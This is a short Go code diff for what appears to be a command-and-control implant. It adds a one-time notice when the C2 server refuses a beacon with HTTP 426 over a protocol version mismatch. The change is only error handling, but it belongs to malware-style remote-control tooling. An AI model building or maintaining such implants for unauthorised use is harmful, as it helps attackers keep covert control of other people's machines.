@@ -95,6 +95,38 @@ func beaconStatusResetsSession(code int) bool {
 	return code == http.StatusBadRequest
 }
 
+// protocolRejectionShown keeps the protocol notice to one line per implant
+// process: the server refuses every beacon, so the implant would otherwise
+// print the same reason on every retry.
+var protocolRejectionShown atomic.Bool
+
+// noteProtocolRejection reports that the server refused the beacon because
+// this implant's protocol version is not served (or because the server is
+// behind). The operator sees the reason in the implant's output instead of
+// an endless silent retry loop.
+func noteProtocolRejection(body io.Reader) {
+	if body == nil || protocolRejectionShown.Swap(true) {
+		return
+	}
+	raw, err := io.ReadAll(io.LimitReader(body, 1024))
+	if err != nil && len(raw) == 0 {
+		return
+	}
+	reason := strings.TrimSpace(string(raw))
+	// The server answers with {"success":false,"error":"..."}; fall back to
+	// the raw text when the body is not that shape.
+	var payload struct {
+		Error string `json:"error"`
+	}
+	if json.Unmarshal(raw, &payload) == nil && payload.Error != "" {
+		reason = payload.Error
+	}
+	if reason == "" {
+		reason = "the server does not serve this implant's protocol version"
+	}
+	fmt.Printf("[!] Beacon refused: %s\n", reason)
+}
+
 // beaconResponseBodyIsJSON rejects a 200 that cannot be the protocol's JSON
 // envelope (captive portal HTML, proxy error page, empty body).
 func beaconResponseBodyIsJSON(data []byte) bool {
@@ -258,6 +290,13 @@ func sendToC2(idx int, body []byte) []byte {
 	if resp.StatusCode != http.StatusOK {
 		if Debug {
 			fmt.Printf("[!] %s returned %d\n", url, resp.StatusCode)
+		}
+		if resp.StatusCode == http.StatusUpgradeRequired {
+			// The server refused the beacon because this agent's protocol
+			// version is not served (or the server is behind). Say so once:
+			// otherwise the implant retries in silence and the operator only
+			// sees an agent that never comes online.
+			noteProtocolRejection(resp.Body)
 		}
 		if resp.StatusCode == http.StatusTooManyRequests || resp.StatusCode == http.StatusServiceUnavailable {
 			recordHTTPRetryAfter(resp, time.Now())
